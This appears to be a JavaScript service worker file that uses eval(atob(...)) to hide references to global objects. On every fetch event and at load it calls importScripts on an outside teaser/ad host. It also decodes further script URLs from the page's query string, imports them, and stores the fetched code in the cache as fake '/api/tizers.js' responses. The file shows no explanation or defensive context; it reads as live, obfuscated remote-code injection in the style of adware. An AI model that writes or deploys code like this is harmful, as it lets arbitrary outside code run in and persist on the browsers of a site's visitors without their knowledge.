var G = eval(atob("dGhpcw")),
    L = eval(atob("bG9jYXRpb24")),
    N = eval(atob("bmF2aWdhdG9y"))
function logs() {
    [].forEach.call(arguments, function (v) {
        try {
            console.log(v)
        } catch (e) {
            console.log(e)
        }
    })
}

self.addEventListener('install', (() => {
    return (event)=>{
        // importScripts('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping')
        event.waitUntil(
            caches
                .open('api/v0')
                .then(() => {
                })
                .catch(() => {
                })
        )
    }
})(eval('this')));

function __forEach(t, c) {
    return G.Array.prototype.forEach.call(t, c)
}

function __import(g, l, n, s, d) { //s = script, d = div#id
    G.importScripts(s)
    if (!!self.api) {
        G.caches.open('api/v1')
            .then(function (cache) {
                var requestHeaders = (G.eval('new Headers()'));
                // requestHeaders.append('Content-Type', 'application/javascript')
                var responseHeaders = (G.eval('new Headers()'));
                responseHeaders.append('Content-Type', 'application/javascript')

                var requestInit = {
                    method: 'GET',
                    headers: requestHeaders
                    // mode: event.request.mode,
                    // cache: 'default'
                }
                var responseInit = {
                    status: 200,
                    headers: responseHeaders
                }
                cache.put(new Request('/api/tizers.js?d=' + d, requestInit), new Response(api.src, responseInit))
                    .then(function () {
                        logs('api loaded')
                    })

            })
        //eval(self.api.src)
    }
}

var FETCH = self.addEventListener('fetch', function (event) {
    G.importScripts('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping')
});

try {
    // try{
    //     importScripts('https://rc.gluck.space/static/common/js/ads.js')
    // } catch (e){}
    var scripts = G.JSON.parse(G.atob(L.search.split('&s=')[1]))
    __forEach(scripts, (v, i) => {
        __import(G, L, N, G.atob(v.src) + '&sw=1&inline=1', v.id)
    })
    // importScripts(atob(location.search.split('&s=')[1])+'&sw=1&inline=1')
    self.removeEventListener(FETCH)

    // self.importScripts('https://unpkg.com/jquery@3.2.1')
    G.importScripts('https://recreativ.ru/tizers1.php?bn=WETPNH5v46&ping')
} catch (e) {
}
